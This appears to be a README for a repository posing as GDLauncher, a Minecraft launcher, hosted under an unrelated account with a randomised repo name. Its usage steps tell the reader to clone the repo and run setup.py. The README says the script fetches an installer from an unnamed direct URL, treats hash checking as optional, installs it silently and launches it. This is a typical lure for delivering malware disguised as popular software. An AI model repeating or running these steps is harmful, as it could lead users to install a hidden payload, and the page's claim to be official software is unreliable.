> GDLauncher is a stylish Minecraft launcher with CurseForge integration. Browse and install mods without leaving the launcher.

## Features

- Built-in CurseForge mod browser
- Microsoft account login support
- Instance management with modpacks
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/gdlauncher-pixel-734.git
cd gdlauncher-pixel-734
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.
